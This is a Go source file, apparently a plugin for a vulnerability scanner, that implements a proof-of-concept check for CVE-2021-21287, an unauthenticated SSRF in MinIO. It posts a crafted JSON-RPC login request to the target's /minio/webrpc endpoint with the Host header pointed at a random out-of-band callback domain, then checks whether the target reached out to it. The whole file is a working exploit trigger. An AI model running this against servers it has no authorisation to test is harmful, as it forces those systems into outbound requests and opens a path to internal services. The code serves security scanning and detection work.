package poc

import (
	"fmt"
	"math/rand"
	"net/http"
	"strings"
	"time"
	"youzai/util"
)

func (Info *PocInfo) CVE_2021_21287_Init() {
	poc := PocInfo{}

	// 设置poc-Info信息
	poc.Info.ID = "CVE-2021-21287"
	poc.Info.Target = "minio"
	poc.Info.Type = "SSRF"
	poc.Info.Name = "MinIO Unauth SSRF"
	poc.Info.Level = 1
	poc.Info.Author = "youzai"

	poc.Poc.Proto = "http"

	poc.Config.Customize = true // 设置为自定义poc
	poc.Config.Url = PocCustomize.Config.Url
	poc.Config.Timeout = PocCustomize.Config.Timeout
	poc.Config.User_Agent = PocCustomize.Config.User_Agent
	poc.Config.Proxy = PocCustomize.Config.Proxy
	poc.Config.Proxy_Url = PocCustomize.Config.Proxy_Url

	// 生成http客户端
	cli := util.Http_Client(poc.Config.Timeout, poc.Config.Proxy, poc.Config.Proxy_Url)

	// 编写自定义检测函数，返回值有两个，第一个是判断是否存在存在漏洞，第二个参数返回响应状态码
	poc.Config.Check = func() (bool, int) {
		pocData := `{"id":1,"jsonrpc":"2.0","params":{"token":  "Test"},"method":"web.LoginSTS"}`
		rand.Seed(time.Now().UnixNano())
		t := rand.Intn(100000)
		randstr := fmt.Sprintf("%d", t)
		ceye_url := randstr + "." + util.Ceye.Ceye_Url

		request, err := http.NewRequest("POST", poc.Config.Url+"/minio/webrpc", strings.NewReader(pocData))
		if err != nil {
			return false, 0
		}
		request.Host = ceye_url
		request.Header.Set("Content-Type", "application/json")
		if response, err := cli.Do(request); err != nil {
			return false, 0
		} else {
			if util.Ceye_Check(randstr) {
				return true, response.StatusCode
			}
		}
		return false, 0
	}

	PocStruct = append(PocStruct, poc)
}
